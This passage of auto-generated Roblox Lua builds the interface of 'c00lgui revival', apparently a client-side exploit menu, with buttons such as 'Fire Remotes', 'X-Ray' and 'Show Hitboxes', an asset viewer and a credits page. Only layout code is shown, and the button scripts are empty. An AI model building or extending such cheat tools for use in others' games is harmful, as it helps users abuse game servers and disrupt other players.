G2L["13f"]["BorderSizePixel"] = 0;
G2L["13f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["TextSize"] = 15;
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["13f"]["RichText"] = true;
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["13f"]["Name"] = [[Button]];
G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["Text"] = [[GUI Sounds: ON]];
G2L["13f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["140"] = Instance.new("LocalScript", G2L["13f"]);
G2L["140"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["141"] = Instance.new("TextButton", G2L["139"]);
G2L["141"]["TextWrapped"] = true;
G2L["141"]["BorderSizePixel"] = 0;
G2L["141"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["TextSize"] = 15;
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["141"]["RichText"] = true;
G2L["141"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["141"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["141"]["Name"] = [[Button]];
G2L["141"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["141"]["Text"] = [[R6 Converter]];
G2L["141"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["142"] = Instance.new("LocalScript", G2L["141"]);
G2L["142"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["143"] = Instance.new("TextButton", G2L["139"]);
G2L["143"]["TextWrapped"] = true;
G2L["143"]["BorderSizePixel"] = 0;
G2L["143"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["143"]["TextSize"] = 15;
G2L["143"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["143"]["RichText"] = true;
G2L["143"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["143"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["143"]["Name"] = [[Button]];
G2L["143"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["143"]["Text"] = [[Server Hop]];
G2L["143"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["144"] = Instance.new("LocalScript", G2L["143"]);
G2L["144"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["145"] = Instance.new("TextButton", G2L["139"]);
G2L["145"]["TextWrapped"] = true;
G2L["145"]["BorderSizePixel"] = 0;
G2L["145"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["TextSize"] = 15;
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["145"]["RichText"] = true;
G2L["145"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["145"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["145"]["Name"] = [[Button]];
G2L["145"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["145"]["Text"] = [[Fire Remotes]];
G2L["145"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["146"] = Instance.new("LocalScript", G2L["145"]);
G2L["146"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..SP
G2L["147"] = Instance.new("TextButton", G2L["139"]);
G2L["147"]["TextWrapped"] = true;
G2L["147"]["BorderSizePixel"] = 0;
G2L["147"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["147"]["TextSize"] = 15;
G2L["147"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["147"]["RichText"] = true;
G2L["147"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["147"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["147"]["Name"] = [[SP]];
G2L["147"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["147"]["Text"] = [[Save Position]];
G2L["147"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..LP
G2L["148"] = Instance.new("TextButton", G2L["139"]);
G2L["148"]["TextWrapped"] = true;
G2L["148"]["BorderSizePixel"] = 0;
G2L["148"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["148"]["TextSize"] = 15;
G2L["148"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["148"]["RichText"] = true;
G2L["148"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["148"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["148"]["Name"] = [[LP]];
G2L["148"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["148"]["Text"] = [[Load Position]];
G2L["148"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..LocalScript
G2L["149"] = Instance.new("LocalScript", G2L["139"]);



-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["14a"] = Instance.new("TextButton", G2L["139"]);
G2L["14a"]["TextWrapped"] = true;
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["TextSize"] = 15;
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["14a"]["RichText"] = true;
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14a"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["14a"]["Name"] = [[Button]];
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Text"] = [[Rejoin]];
G2L["14a"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["14b"] = Instance.new("LocalScript", G2L["14a"]);
G2L["14b"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["14c"] = Instance.new("TextButton", G2L["139"]);
G2L["14c"]["TextWrapped"] = true;
G2L["14c"]["BorderSizePixel"] = 0;
G2L["14c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14c"]["TextSize"] = 15;
G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["14c"]["RichText"] = true;
G2L["14c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14c"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["14c"]["Name"] = [[Button]];
G2L["14c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14c"]["Text"] = [[X-Ray: OFF]];
G2L["14c"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["14d"] = Instance.new("LocalScript", G2L["14c"]);
G2L["14d"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["14e"] = Instance.new("TextButton", G2L["139"]);
G2L["14e"]["TextWrapped"] = true;
G2L["14e"]["BorderSizePixel"] = 0;
G2L["14e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14e"]["TextSize"] = 15;
G2L["14e"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["14e"]["RichText"] = true;
G2L["14e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14e"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["14e"]["Name"] = [[Button]];
G2L["14e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14e"]["Text"] = [[Show Hitboxes: OFF]];
G2L["14e"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["14f"] = Instance.new("LocalScript", G2L["14e"]);
G2L["14f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["150"] = Instance.new("TextButton", G2L["139"]);
G2L["150"]["TextWrapped"] = true;
G2L["150"]["BorderSizePixel"] = 0;
G2L["150"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["TextSize"] = 15;
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["150"]["RichText"] = true;
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["150"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["150"]["Name"] = [[Button]];
G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["Text"] = [[Leave Game]];
G2L["150"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["151"] = Instance.new("LocalScript", G2L["150"]);
G2L["151"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer
G2L["152"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["152"]["Visible"] = false;
G2L["152"]["Active"] = true;
G2L["152"]["BorderSizePixel"] = 0;
G2L["152"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["152"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["152"]["Name"] = [[Asset Viewer]];
G2L["152"]["Size"] = UDim2.new(0, 121, 0, 200);
G2L["152"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["152"]["Position"] = UDim2.new(0.68069, 0, 0.168, 0);
G2L["152"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["152"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.UIListLayout
G2L["153"] = Instance.new("UIListLayout", G2L["152"]);
G2L["153"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["153"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["153"]["Wraps"] = true;
G2L["153"]["Padding"] = UDim.new(0.01, 0);
G2L["153"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["153"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Asset
G2L["154"] = Instance.new("ImageLabel", G2L["152"]);
G2L["154"]["Active"] = true;
G2L["154"]["BorderSizePixel"] = 0;
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["154"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["154"]["Size"] = UDim2.new(0, 118, 0, 118);
G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["BackgroundTransparency"] = 1;
G2L["154"]["Name"] = [[Asset]];
G2L["154"]["Position"] = UDim2.new(0.08678, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Asset.LocalScript
G2L["155"] = Instance.new("LocalScript", G2L["154"]);



-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets
G2L["156"] = Instance.new("ScrollingFrame", G2L["152"]);
G2L["156"]["Active"] = true;
G2L["156"]["BorderSizePixel"] = 0;
G2L["156"]["CanvasSize"] = UDim2.new(0, 0, 0.95, 0);
G2L["156"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["156"]["Name"] = [[Presets]];
G2L["156"]["Size"] = UDim2.new(0, 121, 0, 80);
G2L["156"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["156"]["Position"] = UDim2.new(0, 0, 0.6, 0);
G2L["156"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["156"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.UIListLayout
G2L["157"] = Instance.new("UIListLayout", G2L["156"]);
G2L["157"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["157"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["157"]["Wraps"] = true;
G2L["157"]["Padding"] = UDim.new(0.01, 0);
G2L["157"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["157"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["158"] = Instance.new("TextButton", G2L["156"]);
G2L["158"]["TextWrapped"] = true;
G2L["158"]["BorderSizePixel"] = 0;
G2L["158"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["TextSize"] = 15;
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["158"]["RichText"] = true;
G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["158"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["158"]["Name"] = [[Button]];
G2L["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Text"] = [[team c00lkidd Logo 1]];
G2L["158"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["159"] = Instance.new("LocalScript", G2L["158"]);
G2L["159"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["15a"] = Instance.new("NumberValue", G2L["158"]);
G2L["15a"]["Name"] = [[AssetID]];
G2L["15a"]["Value"] = 128448177017567;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["15b"] = Instance.new("TextButton", G2L["156"]);
G2L["15b"]["TextWrapped"] = true;
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["TextSize"] = 15;
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["15b"]["RichText"] = true;
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["15b"]["Name"] = [[Button]];
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Text"] = [[team c00lkidd Logo 2]];
G2L["15b"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["15c"] = Instance.new("LocalScript", G2L["15b"]);
G2L["15c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["15d"] = Instance.new("NumberValue", G2L["15b"]);
G2L["15d"]["Name"] = [[AssetID]];
G2L["15d"]["Value"] = 72454632890085;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["15e"] = Instance.new("TextButton", G2L["156"]);
G2L["15e"]["TextWrapped"] = true;
G2L["15e"]["BorderSizePixel"] = 0;
G2L["15e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15e"]["TextSize"] = 15;
G2L["15e"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["15e"]["RichText"] = true;
G2L["15e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15e"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["15e"]["Name"] = [[Button]];
G2L["15e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15e"]["Text"] = [[c00lkidd's Avatar]];
G2L["15e"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["15f"] = Instance.new("LocalScript", G2L["15e"]);
G2L["15f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["160"] = Instance.new("NumberValue", G2L["15e"]);
G2L["160"]["Name"] = [[AssetID]];
G2L["160"]["Value"] = 140168524231139;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["161"] = Instance.new("TextButton", G2L["156"]);
G2L["161"]["TextWrapped"] = true;
G2L["161"]["BorderSizePixel"] = 0;
G2L["161"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["161"]["TextSize"] = 15;
G2L["161"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["161"]["RichText"] = true;
G2L["161"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["161"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["161"]["Name"] = [[Button]];
G2L["161"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["161"]["Text"] = [[Thomas]];
G2L["161"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["162"] = Instance.new("LocalScript", G2L["161"]);
G2L["162"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["163"] = Instance.new("NumberValue", G2L["161"]);
G2L["163"]["Name"] = [[AssetID]];
G2L["163"]["Value"] = 160456772;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["164"] = Instance.new("TextButton", G2L["156"]);
G2L["164"]["TextWrapped"] = true;
G2L["164"]["BorderSizePixel"] = 0;
G2L["164"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["164"]["TextSize"] = 15;
G2L["164"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["164"]["RichText"] = true;
G2L["164"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["164"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["164"]["Name"] = [[Button]];
G2L["164"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Text"] = [[team skrubl0rdz]];
G2L["164"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["165"] = Instance.new("LocalScript", G2L["164"]);
G2L["165"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["166"] = Instance.new("NumberValue", G2L["164"]);
G2L["166"]["Name"] = [[AssetID]];
G2L["166"]["Value"] = 358313209;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["167"] = Instance.new("TextButton", G2L["156"]);
G2L["167"]["TextWrapped"] = true;
G2L["167"]["SizeConstraint"] = Enum.SizeConstraint.RelativeYY;
G2L["167"]["BorderSizePixel"] = 0;
G2L["167"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["167"]["TextSize"] = 15;
G2L["167"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["167"]["RichText"] = true;
G2L["167"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["167"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["167"]["Name"] = [[Button]];
G2L["167"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["Text"] = [[team 1x3x5x6]];
G2L["167"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["168"] = Instance.new("LocalScript", G2L["167"]);
G2L["168"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["169"] = Instance.new("NumberValue", G2L["167"]);
G2L["169"]["Name"] = [[AssetID]];
G2L["169"]["Value"] = 891289659;


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button
G2L["16a"] = Instance.new("TextButton", G2L["156"]);
G2L["16a"]["TextWrapped"] = true;
G2L["16a"]["BorderSizePixel"] = 0;
G2L["16a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16a"]["TextSize"] = 15;
G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["16a"]["RichText"] = true;
G2L["16a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16a"]["Size"] = UDim2.new(0, 118, 0, 25);
G2L["16a"]["Name"] = [[Button]];
G2L["16a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Text"] = [[team starp4tch]];
G2L["16a"]["Position"] = UDim2.new(0.0124, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.ButtonScript
G2L["16b"] = Instance.new("LocalScript", G2L["16a"]);
G2L["16b"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Asset Viewer.Presets.Button.AssetID
G2L["16c"] = Instance.new("NumberValue", G2L["16a"]);
G2L["16c"]["Name"] = [[AssetID]];
G2L["16c"]["Value"] = 13513140020;


-- StarterGui.c00lguiSE.Main.Pages.Credits
G2L["16d"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["16d"]["Visible"] = false;
G2L["16d"]["Active"] = true;
G2L["16d"]["BorderSizePixel"] = 0;
G2L["16d"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["16d"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["16d"]["Name"] = [[Credits]];
G2L["16d"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["16d"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["16d"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["16d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16d"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Credits.CreditsnThanks
G2L["16e"] = Instance.new("TextLabel", G2L["16d"]);
G2L["16e"]["TextWrapped"] = true;
G2L["16e"]["Active"] = true;
G2L["16e"]["BorderSizePixel"] = 0;
G2L["16e"]["TextSize"] = 20;
G2L["16e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["16e"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["16e"]["BackgroundTransparency"] = 1;
G2L["16e"]["RichText"] = true;
G2L["16e"]["Size"] = UDim2.new(0, 375, 0, 87);
G2L["16e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16e"]["Text"] = [[Thank you for using c00lgui revival!<br/><font size="15">Have any suggestions? Message Hyperion on Discord!</font><br/><font size="10">Discord Username: hyperionhax</font><br/><br/>Special Thanks:]];
G2L["16e"]["Name"] = [[CreditsnThanks]];
G2L["16e"]["Position"] = UDim2.new(0, 6, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Credits.UIListLayout
G2L["16f"] = Instance.new("UIListLayout", G2L["16d"]);
G2L["16f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["16f"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["16f"]["Wraps"] = true;
G2L["16f"]["Padding"] = UDim.new(0.01, 0);
G2L["16f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["16f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople
G2L["170"] = Instance.new("ScrollingFrame", G2L["16d"]);
G2L["170"]["Active"] = true;
G2L["170"]["BorderSizePixel"] = 0;
G2L["170"]["CanvasSize"] = UDim2.new(0, 0, 1.7, 0);
G2L["170"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["170"]["Name"] = [[SpecialPeople]];
G2L["170"]["Size"] = UDim2.new(0, 388, 0, 166);
G2L["170"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["170"]["Position"] = UDim2.new(0, 0, 0.17, 0);
G2L["170"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["170"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.UIListLayout
G2L["171"] = Instance.new("UIListLayout", G2L["170"]);
G2L["171"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["171"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["171"]["Wraps"] = true;
G2L["171"]["Padding"] = UDim.new(0.01, 0);
G2L["171"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["171"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["172"] = Instance.new("TextLabel", G2L["170"]);
G2L["172"]["TextWrapped"] = true;
G2L["172"]["Active"] = true;
G2L["172"]["BorderSizePixel"] = 2;
G2L["172"]["TextSize"] = 14;
G2L["172"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["172"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["172"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["172"]["BackgroundTransparency"] = 1;
G2L["172"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["172"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["172"]["Text"] = [[Hyperion - GUI, Scripting, owner of team c00lkidd revival]];
G2L["172"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["173"] = Instance.new("TextLabel", G2L["170"]);
G2L["173"]["TextWrapped"] = true;
G2L["173"]["Active"] = true;
G2L["173"]["BorderSizePixel"] = 2;
G2L["173"]["TextSize"] = 14;
G2L["173"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["173"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["173"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["173"]["BackgroundTransparency"] = 1;
G2L["173"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["173"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["173"]["Text"] = [[KebinMaster - Co-Owner, Scripter]];
G2L["173"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["174"] = Instance.new("TextLabel", G2L["170"]);
G2L["174"]["TextWrapped"] = true;
G2L["174"]["Active"] = true;
G2L["174"]["BorderSizePixel"] = 2;
G2L["174"]["TextSize"] = 14;
G2L["174"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["174"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["174"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["174"]["BackgroundTransparency"] = 1;
G2L["174"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["174"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["174"]["Text"] = [[Rouge - Original UI Design]];
G2L["174"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["175"] = Instance.new("TextLabel", G2L["170"]);
G2L["175"]["TextWrapped"] = true;
G2L["175"]["Active"] = true;
G2L["175"]["BorderSizePixel"] = 2;
G2L["175"]["TextSize"] = 14;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["175"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["175"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["175"]["BackgroundTransparency"] = 1;
G2L["175"]["Size"] = UDim2.new(0, 385, 0, 25);
